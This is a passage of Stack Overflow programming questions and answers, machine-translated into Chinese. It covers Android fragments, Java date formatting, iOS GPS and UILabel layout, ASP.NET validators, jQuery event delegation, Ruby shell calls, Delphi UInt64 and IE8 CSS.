03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.os.Looper.loop(Looper.java:137)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.app.ActivityThread.main(ActivityThread.java:5234)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at java.lang.reflect.Method.invokeNative(Native Method)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at java.lang.reflect.Method.invoke(Method.java:525)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:799)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:566)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at dalvik.system.NativeStart.main(Native Method)
03-19 23:44:40.423: E/AndroidRuntime(30386): Caused by: android.support.v4.app.SuperNotCalledException: Fragment AndroidFragment{42678970 #0 id=0x1020002 android} did not call through to super.onResume()
03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:919)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:1080)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:1062)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.support.v4.app.FragmentManagerImpl.dispatchResume(FragmentManager.java:1820)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.support.v4.app.FragmentActivity.onPostResume(FragmentActivity.java:412)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at com.actionbarsherlock.app.SherlockFragmentActivity.onPostResume(SherlockFragmentActivity.java:69)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.app.Activity.performResume(Activity.java:5230)
03-19 23:44:40.423: E/AndroidRuntime(30386):    at android.app.ActivityThread.performResumeActivity(ActivityThread.java:2865)
03-19 23:44:40.423: E/AndroidRuntime(30386):    ... 12 more 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T22:58:49.567

你忘记`super.onResume()`打电话了，好像：

```
 ...
  ...

  @Override
  public void onResume() {
      super.onResume(); // don't forget to call super.onResume()
      Log.w("Aplikacija_resume","Startovana" );
      new loadListView().execute();

  }  

  ...
  ... 
```**

# java - 为什么我的 GUI 中的日期时间格式错误？

> ID：15510845
> 
> 赞同：0
> 
> 时间：2013-03-19T21:32:37.620
> 
> 标签：java, swing, parsing, calendar, simpledateformat

我正在开发一个客户端服务器应用程序，服务器向客户端发送一些东西，客户端可以看到显示在 GUI 中的项目。我可以从服务器完美地发送所有内容，以显示在客户端的 JTextarea 上。但是，我面临的一个问题是在客户端显示日期，我在 GUI 的文本区域中收到一个长文本，看起来像 java.util.Gregeon CalenderCalender[time?= etc..... 在所有文本之后，我仍然可以在文本区域的底部看到日期，但它的格式不正确。

这是客户端代码的一部分，用于处理从服务器接收信息并将信息显示到 GUI 上。

```
 public void  displayItems() 
{
    Integer itemNumber = networkInput.nextInt();
    networkInput.nextLine();
    //String bidTime = networkInput.next();
    //= networkInput.next();

    DefaultListModel<String> lmdl = new DefaultListModel<String>();

    for(int i=0; i<itemNumber; i++)
    {
        String itemCode = networkInput.nextLine();
        String itemName = networkInput.nextLine();
        String itemDescription = networkInput.nextLine();
        String date = networkInput.nextLine();
        System.out.println(date);
        int hrs = Integer.parseInt(date.substring(0,2));
        int mins = Integer.parseInt(date.substring(3,5));
        Items item = new Items(itemCode,itemName,itemDescription, hrs, mins);
        itemList.add(item);

        lmdl.addElement(item.getItemCode());

    }
    ItemList.setModel(lmdl);// Add to List

}
   class ButtonHandler implements ActionListener 
   {
       private Object sel;
        public void actionPerformed(ActionEvent e) 
        {
            int selectedIx = ItemList.getSelectedIndex();
            String bid = txtBidAmount.getText();
            System.out.println("Sending the bid for " + itemList.get(selectedIx).getItemCode() + " for " + bid);

            output.println("bid");
            output.println(itemList.get(selectedIx).getItemCode());
            output.println(bid);

            String serverResponce = networkInput.nextLine();
            System.out.println(serverResponce);
            if(serverResponce.contains("success"))
            {
                //display sucess
                JOptionPane.showMessageDialog(frame,"Bid accepted");
            }
            else
            {
                JOptionPane.showMessageDialog(frame,"low bid");
            }

        }
   }

  class  RefreshListner implements ListSelectionListener{
     //String date = networkInput.nextLine();
    @Override
    public void valueChanged(ListSelectionEvent arg0) {

        Integer IDx = ItemList.getSelectedIndex();
        text.setText(itemList.get(IDx).getName()+ "\n" + itemList.get(IDx).getDescription() + itemList.get(IDx).getDeadline());

    }

  } 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:38:46.727

GregorianCalendar的`toString`方法不会产生显示友好的时间字符串。在将其设置到文本区域之前，您需要使用 DateFormatter 将其转换为更“令人愉悦”的格式。这是一个可以扩展的简单示例：

```
Calendar calendar = new GregorianCalendar();
DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
String formattedDate = formatter.format(calendar.getTime()); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T22:27:54.680

问题是您只需要从输入字符串中获取时间：

```
String date = networkInput.nextLine();
int hrs = Integer.parseInt(date.substring(0,2));
int mins = Integer.parseInt(date.substring(3,5)); 
```

看起来您在输入行中有类似“10:39”的内容 - 解析完整日期（包括日、月和年）并创建日历对象：

```
DateFormat df = new SimpleDateFormat("dd/mm/yyyy HH:mm");
Date date = df.parse(networkInput.nextLine()); 
```

然后使用日期对象，如果需要，您可以使用它只是时间。

# iphone - 无法在 iPhone 上获取 GPS 位置

> ID：15510847
> 
> 赞同：3
> 
> 时间：2013-03-19T21:32:40.303
> 
> 标签：iphone, cocoa-touch, gps, ios-simulator

我的应用程序在模拟器上完美运行，一切正常。但现在我想把它放在我的 iPhone 上，我发现 GPS 功能不起作用。

这是我的代码。

```
 [super viewDidLoad];

    //eigener Standort
    locationManager = [[CLLocationManager alloc] init];
    locationManager.delegate = self;
    locationManager.distanceFilter = kCLDistanceFilterNone; // whenever we move
    locationManager.desiredAccuracy = kCLLocationAccuracyHundredMeters; // 100 m
    [locationManager startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
    didUpdateToLocation:(CLLocation *)newLocation
           fromLocation:(CLLocation *)oldLocation
{
    eigLat = newLocation.coordinate.latitude;
    eigLon = newLocation.coordinate.longitude;

    eigLatString = [NSString stringWithFormat:@"%f", eigLat];
    eigLonString = [NSString stringWithFormat:@"%f", eigLon];
} 
```

直到现在一切都很好。如果我使用 NSLog，我会得到正确的坐标。

但后来我想在这里使用我的坐标：

```
- (void)connectionDidFinishLoading:(NSURLConnection *)connection
{
    [UIApplication sharedApplication].networkActivityIndicatorVisible = NO;

    news = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:NULL];

    for (x=0; x<[news count]; x++)
    {
        //Berechnung der Entfernung
        erdradius = 6371.1;

        //Koordinaten von Datenbank in String schreiben
        NSString *latitude = [[news objectAtIndex:x] objectForKey:@"Latitude"];
        NSString *longitude = [[news objectAtIndex:x] objectForKey:@"Longitude"];

        entfernung = 0;
        double lat1 = eigLat;                   //eigener Standort Latitude
        double long1 = eigLon;                  //eigener Standort Longitude
        double lat2 = [latitude doubleValue];   //Standort Heurigen Latitude
        double long2 = [longitude doubleValue]; //Standort Heurigen Longitude 
```

在那里，lat1 和 lat2 每次都得到 0。但前提是我在 iPhone 上运行应用程序。在模拟器上它工作正常。

有人知道为什么会这样吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:59:39.803

问题是您还没有在现实世界中获得 GPS 位置，因此您的方法在被`connectionDidFinishLoading()`调用之前`didUpdateToLocation()`被调用。
因此 eighValue 仍为 0。

首先检查有效的纬度和经度：
如果两者都是 0，那么您没有获得位置。

我认为您必须更改程序代码的逻辑，
您必须要么

1）等到你有一个位置，然后开始
连接，以便在你有 GPS 坐标后调用 connectionDidFinishLoading。

或者2）你存储网络连接的坐标结果，并在你得到你的第一个坐标时计算

# ios - 具有正确缩放的横向IOS预览

> ID：15510849
> 
> 赞同：2
> 
> 时间：2013-03-19T21:32:43.627
> 
> 标签：ios, camera, zooming, landscape, preview

谁能给我一个IOS 5或更高版本的最小例子

捕获背面摄像头视频的应用程序具有以下要求：

1.  相机拍摄的图像分辨率为1280x720

2.  预览层是 AVCaptureVideoPreviewLayer 并在 iPhone 5 和 4 上填充全屏

3.  视频和预览的方向都是 LandScapeRight

4.  如果我想放大预览，我会正确放大横向图像的中心

我让一切正常工作到 4 点。）。但是每次我尝试应用缩放时

```
viewLayer.affineTransform = CGAffineTransformMakeScale(2, 2); 
```

我观察到在横向中，聚焦图像的中心位于未缩放图像的中心下方。这就是我要解决的问题。因此，如果我将比例设置为 1、1.3、1.6 或 2.0，我希望始终看到未缩放图像的中心。

# asp.net - 使用 ASP.NET 验证器来验证复合控件数据

> ID：15510855
> 
> 赞同：0
> 
> 时间：2013-03-19T21:32:59.243
> 
> 标签：asp.net, validation

**背景：**我有一个用于构建表单的 CompositeControls 工具集。控件本身与一些用于基本验证任务的 jquery 验证相关联。

**问题：** 我希望通过允许开发人员使用 ASP.NET 验证器（即 RegExValidator、RequiredFieldValidator、CustomValidator 等）来验证我的一个 CompositeControls 中的数据，从而使这些 CompositeControls 的验证更加灵活。

**示例：** 我希望开发人员能够执行以下操作：

```
<asp:ValidationSummary runat=server HeaderText="There were errors on the page:" />

<custom:TextBox id='SomeTextBox' Label='Enter Name Here:' text='' runat='server' />

<asp:RequiredFieldValidator runat=server ControlToValidate=SomeTextBox ErrorMessage="Name is required."> *
</asp:RequiredFieldValidator> 
```

我已将“ValidationProperty”添加到复合文本框，但RequiredFieldValidator（或任何其他验证器）似乎无法识别文本框或来自它的数据。文本框（以及我构建的所有其他自定义 CompositeControls）继承 CompositeControl，将属性“ValidationProperty”设置为公开控件数据元素的公共属性，并且还包含“字符串 ValidationGroup”属性。

**问题：**是否有人知道复合控件还需要什么或具体需要什么才能很好地与 ASP.NET 验证器配合使用（我宁愿避免在复合控件中包含所有验证器类型的实例，除非这是必要的）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T00:12:24.280

我最后一次研究这个问题是在 2005 年左右，但据我记得，这里有两个不同的问题：

1.  客户端验证代码如何找到要验证的值
2.  服务器端验证如何找到要验证的值

`ValidationProperty`如果我没记错的话，设置只会影响服务器端验证。如果您还没有，请在回发后检查`IsValid`验证器的属性是否设置为`false`服务器端。

这可能已经改变，但我认为验证控件只能验证与它们具有相同命名容器的控件也是正确的。

在客户端，我有点模糊，但我认为情况仍然是验证脚本将寻找一个客户端 ID 对应于它被告知要查找的服务器 ID 的元素，并`value`在那。如果您没有*在客户端*公开一个，它将无法找到任何要验证的内容。

如果您有时间，逐步完成验证 javascript 会很有帮助。这将教你很多关于客户端验证如何找到它验证的值的知识。

希望这可以帮助。

# facebook - Facebook Graph API /me/family 查询返回的“关系”字段的可能值是什么？

> ID：15510857
> 
> 赞同：0
> 
> 时间：2013-03-19T21:33:03.813
> 
> 标签：facebook, api

似乎无法在文档或此处找到它。开始认为这个列表不存在。

我正在寻找可以在 Facebook Graph API 查询的“关系”字段中返回的可能值的完整列表（或生成此类列表的方法），如下所示：

[https://graph.facebook.com/me/family?access_token=ACCESS_TOKEN](https://graph.facebook.com/me/family?access_token=ACCESS_TOKEN)

（您当然需要提供自己的 ACCESS_TOKEN 来查看此类查询的结果。API 资源管理器非常适合这种事情 - [https://developers.facebook.com/tools/explorer/](https://developers.facebook.com/tools/explorer/)）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T10:17:03.540

[如此处所述](http://yourpalmark.github.com/facebook-actionscript-api/docs/com/facebook/graph/data/fql/user/FQLUser.html#family)-

> 关系——描述关系类型的字符串。可以是父母、母亲、父亲、兄弟姐妹、姐妹、兄弟、孩子、儿子、女儿之一。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:43:03.233

如果您查看[FQL 系列文档](https://developers.facebook.com/docs/reference/fql/family)，该`relationship`字段被列为字符串。这些通常不会在任何地方列举。

# javascript - 获取在 JQuery 中单击的动态 div 的名称？

> ID：15510860
> 
> 赞同：2
> 
> 时间：2013-03-19T21:33:07.323
> 
> 标签：javascript, jquery, html

所以我有一组生成的 div，其中包含一个名为“class1”的类。我需要能够为他们分配一个名称或 ID，然后使用 JQuery 来注册我点击了其中一个特定的 div。我有这段代码，但这不起作用，因为我所知道的只是选择类名：

```
jQuery(".class1").click(function () {
     // do something                    
}); 
```

我需要能够获取单击的 div 的唯一标识符并将其用于某些事情

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:38:03.097

要访问被点击元素的 id，您可以访问其具有被点击 HTML 元素上下文的`id`属性。`this`

```
jQuery(".class1").click(function () {
     // do something                    
     var theId = this.id; // contains the id of the clicked element, assuming is has an id.
}); 
```

您提到动态元素，在这种情况下，您需要在添加元素后绑定事件或使用委托绑定。

对于 jQuery 1.7 及更高版本使用[**on()**](http://api.jquery.com/on/)：

```
jQuery("body").on("click", ".class1", function () {
     // do something                    
     var theId = this.id;
}); 
```

对于 jQuery 1.6 和更早的版本，[**delegate()**](http://api.jquery.com/delegate/)：

```
jQuery("body").delegate(".class1", "click", function () {
     // do something                    
     this.id;
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:33:59.993

如果您在 DOM 加载后生成类名.. 动态，那么您需要使用委托事件处理程序。

```
jQuery('body').on('click', '.class1', function() {

  // to assign name
  $(this).attr('name', 'someName');

  // to assign ID
  $(this).attr('id', 'someUniqueID');

  // to get

  this.id  //  to get id

  this.name // to get name

}); 
```

**笔记：**

在委托事件处理的情况下，您应该使用任何静态容器元素来`.class1`代替`body`. 这是有效和最好的方法。

# php - 资产和主题

> ID：15510861
> 
> 赞同：0
> 
> 时间：2013-03-19T21:33:10.147
> 
> 标签：php, pyrocms

我试图弄清楚为什么在添加此资产行后它会变成它下面的行，但显示一个 404 文件未找到，而实际上它确实存在。

Asset::css('theme::bootstrap/bootstrap.css');

http://dev.myurl/application/themes/mytheme/assets/css/bootstrap/bootstrap.css” rel=“stylesheet”>

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T18:46:36.483

试试这个：

```
<?php 
Asset::css('bootstrap/bootstrap.css');
echo Asset::render(); 
?> 
```

# ios - iOS 检查是否发生 UILocalNotification 条件

> ID：15510866
> 
> 赞同：1
> 
> 时间：2013-03-19T21:33:25.133
> 
> 标签：ios, uilocalnotification

我阅读了很多关于 UILocalNotification 的文档和代码。我的警报发生在条件（计算值提高）限制时。

使用 localNotification.repeatInterval = NSHoursCalendarUnit

我的通知每小时重新发送一次。如何在发送（或不发送）通知之前要求 LocalNotificationCenter 进行计算？

举个例子：

值 == 1 -> 通知，值为 1。

如果值更改-> 通知，值已更改，则每隔一小时重新计算值

提前感谢您的帮助，雅克

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T22:08:02.783

不幸的是，您在安排本地通知时无法设置自己的约束。您唯一能做的就是在通知触发时忽略它。（但是当应用程序关闭时，你不能做任何事情）

# html - 在文本末尾放置绝对框（根据文本长度灵活调整）

> ID：15510870
> 
> 赞同：0
> 
> 时间：2013-03-19T21:33:41.317
> 
> 标签：html, css, layout

我想在文本链接的末尾放置一个绝对弹出框。

HTML

```
<div style="float:left;">Hello World</div><div class="box">BOX</div> 
```

CSS

```
.box
{
    float:left;
    border-color:#000;
    border-style:solid;
    border-width:1px;
    width:80px;
    height:80px;
    text-align:center;
} 
```

![在此处输入图像描述](../Images/d6f04904bfebf36c04ddb87103e6400f.png)

[http://jsfiddle.net/7N6ye/1/](http://jsfiddle.net/7N6ye/1/)

只有当一个盒子是相对的时它才能正常工作。当我设置`position:absolute`在盒子上时，它看起来像

![在此处输入图像描述](../Images/8708ba045bee323e6fb3cea86db274b4.png)

[http://jsfiddle.net/7N6ye/3/](http://jsfiddle.net/7N6ye/3/)

有任何想法吗？最终，我会有一个链接列表，每个链接都有不同的文本长度。（并且每个框都会在文本末尾弹出）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:43:00.227

如果将位置设置为相对，则 div 将相对于其原始位置放置。例如，距您所在位置左侧 100 像素

如果将位置设置为绝对，则 div 相对于其父级（具有相对或绝对定位的下一个父级）放置。例如，距父级左角 100px

最重要的是，div 不再是文档流的一部分。所以其他元素可以与它重叠。

浮动元素也是如此。这里使用下一个可用位置。

一般来说，设置绝对定位和浮动是没有意义的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:43:08.530

这可能有效：

```
<div  class="box">Hello World<div>BOX</div></div> 
```

使用 CSS：

```
.box {
    position: relative;
    border: 1px solid red;
    float: left;
}
.box div
{
    position:absolute;
    top: 0;
    left: 100%;
    border-color:#000;
    border-style:solid;
    border-width:1px;
    width:80px;
    height:80px;
    text-align:center;
    display: inline-box;
} 
```

小提琴参考：http: [//jsfiddle.net/audetwebdesign/DWe8B/](http://jsfiddle.net/audetwebdesign/DWe8B/)

**笔记**

(1) 我将弹出框嵌套在文本行中。我可以解决这个问题。
问题是弹出窗口继承了父级的宽度，因此除非您指定宽度，否则框可能会很窄。

# ruby-on-rails - 通过 ruby 调用 shell 命令时，该命令在什么上下文中运行？

> ID：15510871
> 
> 赞同：0
> 
> 时间：2013-03-19T21:33:42.267
> 
> 标签：ruby-on-rails, ruby, linux, ubuntu

在 Rails 应用程序（或 sinatra）中，如果我调用 shell 命令，该命令在什么上下文中运行？

我不确定我的问题是否正确，但它是否与 rails 进程在同一个线程中运行？

当您掏出钱时，是否可以进行异步调用？如果是，这是否意味着在操作系统级别它将启动一个新线程？它可以从线程池而不是新线程开始吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T22:33:12.490

如果您使用`system('cmd')`或只是反引号：

```
`cmd` 
```

然后该命令将在子shell 的上下文中执行。如果你希望一次运行多个，你可以使用 Rubys fork 功能：

```
fork { system('cmd') }
fork { system('cmd') } 
```

这将创建多个子进程，它们在各自的子外壳中运行各个命令。

在此处阅读分叉：[http ://www.ruby-doc.org/core-2.0/Process.html#method-c-fork](http://www.ruby-doc.org/core-2.0/Process.html#method-c-fork)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T22:42:52.933

它不仅仅是一个新线程，它是一个完全独立的过程。它将是同步的，并且在命令完成之前控制不会返回给 Ruby。如果您想要一个即发即弃的解决方案，您可以简单地将任务置于后台：

```
$ irb

irb(main):001:0> system("sleep 30 &")
=> true
irb(main):002:0>

$ ps ax | grep sleep

3409 pts/4    S      0:00 sleep 30 
```

您可以通过`system("foo &")`或启动任意数量的进程``foo &``。

如果您想更好地控制从 Ruby 启动后台进程，包括正确分离 tty 和许多其他东西，请查看[daemons](http://daemons.rubyforge.org/) gem。这更适合您想要管理的长时间运行的进程，使用 PID 文件等，但也可以使用它来启动任务。

根据您的需要，有用于管理后台进程的替代解决方案。[resque](https://github.com/defunkt/resque) gem在排队和管理后台作业方面很受欢迎。它需要 Redis 和一些设置，但如果您需要那种级别的控制，那就太好了。

# ios - 垂直对齐 UILabel 文本与约束且不换行（自动布局，单行）

> ID：15510875
> 
> 赞同：15
> 
> 时间：2013-03-19T21:33:54.927
> 
> 标签：ios, autolayout

所以我在 IB 中设置了我的视图，这样这个文本标签通过约束与缩略图的顶部对齐。

![在此处输入图像描述](../Images/2e204bce0fd37be58745e6a5aedc294f.png)

然而，正如我们所知，您不能垂直对齐 UILabel 中的文本。我的文本会根据内容的长度更新字体大小。全尺寸文本看起来很棒，而小文本在视图上显着降低。

![在此处输入图像描述](../Images/2a7ed7df69281a90ed03ac77a776e2b4.png)

[现有的解决方案](https://stackoverflow.com/a/1054681/287403)涉及调用 sizeToFit 或更新 uilabel 的框架以匹配文本的高度。不幸的是，后者（尽管丑陋）的解决方案不能很好地处理不应该更新框架的约束。当您需要让文本自动收缩直到被截断时，前一种解决方案基本上不起作用。（因此它不适用于有限数量的行和自动收缩）。

现在至于为什么 uilabel 的固有大小（高度）不会像宽度一样通过“大小以适合内容”设置为自然大小时更新，这超出了我的理解。似乎它绝对应该，但事实并非如此。

所以我只能寻找替代解决方案。据我所知，您可能必须在标签上设置高度约束，并在计算文本高度后调整高度常数。有人有好的解决方案吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-11-06T00:16:24.147

这个问题是真正要解决的 PITA。有效的 API 在 iOS7 中已被弃用，或者 iOS7 替换 API 已损坏，这无济于事。呸！

您的解决方案很好，但是它使用了已弃用的 API ( `sizeWithFont:minFontSize:actualFontSize:forWidth:lineBreakMode:`)，并且封装得不是很好 - 您需要将此代码复制到您想要此行为的任何单元格或视图中。从好的方面来说，它相当有效！一个错误可能是当您进行计算时标签尚未布局，但您根据其宽度执行计算。

我建议您将此行为封装在 UILabel 子类中。通过将尺寸计算放在覆盖的`intrinsicContentSize`方法中，标签将自动调整尺寸。我编写了以下内容，其中包含将在 iOS6 上执行的代码，以及我的版本，使用适用于 iOS7 或更高版本的非弃用 API：

```
@implementation TSAutoHeightLabel

- (CGSize) intrinsicContentSize
{
    NSAssert( self.baselineAdjustment == UIBaselineAdjustmentAlignCenters, @"Please ensure you are using UIBaselineAdjustmentAlignCenters!" );

    NSAssert( self.numberOfLines == 1, @"This is only for single-line labels!" );

    CGSize intrinsicContentSize;

    if ( [self.text respondsToSelector: @selector( boundingRectWithSize:options:attributes:context: )] )
    {
        NSStringDrawingContext* context = [NSStringDrawingContext new];
        context.minimumScaleFactor = self.minimumScaleFactor;

        CGSize inaccurateSize = [self.text boundingRectWithSize: CGSizeMake( self.bounds.size.width, CGFLOAT_MAX )
                                                        options: NSStringDrawingUsesLineFragmentOrigin
                                                     attributes: @{ NSFontAttributeName : self.font }
                                                        context: context].size;

        CGSize accurateSize = [self.text sizeWithAttributes: @{ NSFontAttributeName : [UIFont fontWithName: self.font.fontName size: 12.0] } ];

        CGFloat accurateHeight = accurateSize.height * inaccurateSize.width / accurateSize.width;

        intrinsicContentSize = CGSizeMake( inaccurateSize.width, accurateHeight);
    }
    else
    {
        CGFloat actualFontSize;

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"

        [self.text sizeWithFont: self.font
                    minFontSize: self.minimumFontSize
                 actualFontSize: &actualFontSize
                       forWidth: self.frame.size.width
                  lineBreakMode: NSLineBreakByTruncatingTail];

#pragma GCC diagnostic pop

        CGRect lineBox = CTFontGetBoundingBox((__bridge CTFontRef)([UIFont fontWithName: self.font.fontName size: actualFontSize]));

        intrinsicContentSize = lineBox.size;
    }

    return intrinsicContentSize;
}

@end 
```

这个实现并不完美。我必须确保使用baselineAdjustment == UIBaselineAdjustmentAlignCenters，而且我不能100% 确定我理解为什么。而且我对必须跳过以获得准确的文本高度的箍不满意。我的计算产生的结果和你的计算结果之间也存在一些像素差异。随意使用它并根据需要进行调整:)

`boundingRectWithSize:options:attributes:context`API 对我来说似乎很糟糕。虽然它（大部分！）正确地将文本限制为输入大​​小，但它没有计算正确的高度！它返回的高度基于所提供字体的行高，即使正在缩放。我的猜测是这就是为什么`UILabel`默认情况下没有这种行为？我的解决方法是计算高度和宽度都准确的不受约束的大小，然后使用受约束和不受约束的宽度之间的比率来计算受约束大小的准确高度。什么皮塔饼。Apple 开发论坛和 SO 上有很多抱怨指出这个 API 有很多这样的问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T22:41:57.147

所以我找到了一个解决方法。这有点冒险，但它有效。

所以我所做的是在 IB 中为我的文本行添加高度约束，并在我的视图中获取对它的引用。

然后在 layoutSubviews 中，我根据我必须计算的字体大小更新我的约束高度：

```
- (void)layoutSubviews {
    if (self.titleLabel.text) {
        CGFloat actualFontSize;
        CGSize titleSize = [self.titleLabel.text sizeWithFont:self.titleLabel.font minFontSize:9.0 actualFontSize:&actualFontSize forWidth:self.titleLabel.frame.size.width lineBreakMode:NSLineBreakByTruncatingTail];
        CGRect lineBox = CTFontGetBoundingBox((__bridge CTFontRef)([UIFont fontWithName:@"ProximaNova-Regular" size:actualFontSize]));
        self.titleHeightConstraint.constant = lineBox.size.height;
    }
    [super layoutSubviews];
} 
```

起初我只是将它设置为实际的字体大小，但即使进行了调整 (*1.2)，它仍然会裁剪较小的字体大小。关键是使用`CTFontGetBoundingBox`根据我的计算确定的字体大小。

这很不幸，我希望有更好的方法。也许我应该改用包装。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-09-07T20:33:40.400

TomSwift 感谢您的回答，我真的很努力解决这个问题。

如果有人仍然有奇怪的行为，我必须改变：

> 内在内容大小 = CGSizeMake（不准确的大小。宽度，准确的高度）；

到

> intrinsicContentSize = CGSizeMake(inaccurateSize.width, accuracyHeight * 2);

然后它就像魅力一样。

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2013-03-19T21:37:18.463

您正在寻找的是这两行代码。

```
myLabel.numberOfLines = 0;
myLabel.lineBreakMode = UILineBreakModeWordWrap; 
```

您还可以在“换行符”和“行”下的“属性检查器”中找到它。

# delphi - 对 UInt64 感到困惑

> ID：15510876
> 
> 赞同：2
> 
> 时间：2013-03-19T21:33:55.793
> 
> 标签：delphi, delphi-xe2, uint64

下面的代码片段演示了我最近从最近的 ISO 映像文件重新安装 Delphi XE2 中的文本 IO 和 UInt64 类型变量时遇到的问题 - 编译失败并出现与缺少 Text.ReadUInt64 函数或过程有关的错误消息。如果我用

```
 ReadLn(F,A); 
```

然后程序编译，正确写入

```
-1
18446744073709551615 
```

到文本文件，然后（如预期的那样）在第二次读取时失败并出现 EInOutError：“无效的数字输入”。我的安装是否损坏或有人未能编写 ReadUInt64 函数？我可以在帮助中找到的对 ReadUInt64 的唯一引用是以下定义：

```
function ReadUInt64: UInt64; virtual; 
```

在 System.Classes.TBinaryReader.ReadUInt64 中。我不确定这是否是“相同”功能，或者，如果是，为什么它是虚拟的......

Help 对 UInt64 的引用也让我有些困惑。它将其定义为：

```
type UInt64 = Int64; 
```

如果这是正确的，编译器如何知道将 UInt64 与 Int64 变量区别对待？

```
procedure TForm1.Button1Click(Sender: TObject);
var
  F : TextFile;
  A : Int64;
  B : Uint64;
begin
{
Compiler warns on following line with message:
[DCC Warning] Unit1.pas(32): W1012 Constant expression violates subrange bounds
}
  A := $FFFFFFFFFFFFFFFF;
  B := $FFFFFFFFFFFFFFFF;
  AssignFile(F,'test.txt');
  ReWrite(F);
  Writeln(F,A);
  Writeln(F,B);
  CloseFile(F);
  AssignFile(F,'test.txt');
  ReSet(F);
  ReadLn(F,A);
{
Fails to compile on following line with message:
[DCC Fatal Error] Unit1.pas(42): E2158 System unit out of date or corrupted: missing 'Text.ReadUInt64'
}
  ReadLn(F,B);
  CloseFile(F);
end; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-19T22:06:41.400

见[QC102876](http://qc.embarcadero.com/wc/qcmain.aspx?d=102876)。这是一个已知错误，报告为`Text.ReadUInt64 missing`，描述如下：

> 当应该从流中读取 UInt64 时，编译器会生成对 Text.ReadUInt64 的调用。但是，链接器抱怨缺少 Text.ReadUInt64。

据 QC 称，此问题（错误）在 XE3（内部版本 #17.0.4625.53395）中得到解决。

# delphi - 编译器指令 IF 和 IFEND

> ID：15510878
> 
> 赞同：0
> 
> 时间：2013-03-19T21:33:58.463
> 
> 标签：delphi

我有一个项目组，其中包含三个项目（两个 exe 和一个 dll）。现在，在两个 exe 项目共享的一个单元中，我只想在特定项目中编译特定区域。我怎样才能做到这一点？我应该做这样的事情吗？

```
{$IF PROJECT1}
// Compile this code
{$IFEND} 
```

我以前从未使用过 Delphi 编译器指令。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:38:53.830

[编译器指令](http://docwiki.embarcadero.com/RADStudio/XE3/en/Delphi_compiler_directives)是在项目级别定义的（项目 > 选项 > Delphi 编译器 > 编译），所以只要你定义了指令，它就应该像你描述的那样工作。

# javascript - IE8 不动态应用 css 显示

> ID：15510880
> 
> 赞同：3
> 
> 时间：2013-03-19T21:34:02.440
> 
> 标签：javascript, html, css, internet-explorer, stylesheet

我正在尝试开发一个在给定值上隐藏其列的表。我正在使用[另一个 SO question](https://stackoverflow.com/questions/2858339/show-hide-html-table-columns-using-css)中讨论的解决方案。作为建议的一部分，他们说要支持 IE<8 浏览器，应该使用隐藏规则并默认显示。（我的浏览器处于怪癖模式）。

我有几个如下所示的隐藏规则。

```
 table.Show1 .cellType2, table.Show1 .cellType3{
       display:none;
  } 
```

所以我期望的是在动态更改表`cellType2`时`cellType3`隐藏。`className`使用初始值它可以正常工作，但是当表的类名动态更改时，它会隐藏所需的单元格，但不会将另一个单元格带回来。

我用 IE Developer Tool 完成了它，我知道表的 className 设置正确。我还检查了单元格元素的样式并且没有设置显示规则，所以我希望显示为默认值，但它不是（它不显示）。

我发现最烦人的是，如果我在 Developer Tool 中更改**任何**样式属性，它会意识到它应该显示单元格，然后将其恢复。

为什么不应用样式？请帮我解决这个问题。

编辑：我包含一个“最小”代码来重新创建问题。

JavaScript：

```
function typeChanged(name, id)
{
   var elem =  document.getElementById(id);
   elem.className = name;
} 
```

CSS：

```
table td
{
border-top: 1px none #000066;
border-right: 1px none #000066;
border-bottom: 1px solid #000066;
border-left: 1px solid #000066;
}
table.Show1 .cellType2, table.Show2 .cellType1{
       display:none;
 } 
 table.Show1 td,table.Show2 td
 {
border-style: solid solid solid solid;
border-width: 1px;
 }
  table.Show1 th,table.Show2 th,table.Show1,table.Show2
  {
background: transparent none repeat scroll 0% 0%;
color: #000066;
border-style: none none none none;
table-layout: fixed;
   } 
```

HTML：

```
